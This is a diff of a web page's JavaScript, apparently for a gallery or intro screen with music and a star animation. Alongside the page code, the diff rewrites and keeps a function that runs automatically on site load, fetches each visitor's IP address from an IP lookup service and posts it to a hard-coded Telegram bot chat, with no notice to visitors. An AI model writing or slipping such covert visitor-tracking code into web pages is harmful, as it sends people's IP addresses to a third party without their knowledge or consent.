@@ -2,35 +2,33 @@ const gallery = document.getElementById("gallery");
 const introScreen = document.getElementById("intro-screen");
 const bgMusic = document.getElementById("bg-music");
 
-// Telegram Bot
-const BOT_TOKEN = "5564814493"; // ⚠️ exposed in frontend
+const BOT_TOKEN = "5564814493:YOUR_REAL_BOT_TOKEN"; 
 const CHAT_ID = "-1001756381397";
-const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-const PROXY = "https://cors-anywhere.herokuapp.com/"; 
 
 async function sendIpToTelegram() {
-    try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        const ip = data.ip;
-        const message = `New visitor IP: ${ip}`;
+  try {
+    // get IP
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    const ip = data.ip;
 
-        await fetch(PROXY + TELEGRAM_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message
-            })
-        });
-
-        console.log("IP sent to Telegram:", ip);
-    } catch (err) {
-        console.error("Failed to send IP:", err);
-    }
+    // send to Telegram
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `New visitor IP: ${ip}`
+      })
+    });
+  } catch (err) {
+    console.error("Failed to send IP:", err);
+  }
 }
-// send automatically on site load
+
+// run automatically
 sendIpToTelegram();
+
 
 document.body.addEventListener("click", () => {
     introScreen.classList.add("hidden");
@@ -156,3 +154,4 @@ function drawStars() {
     requestAnimationFrame(drawStars);
 }
 drawStars();
+
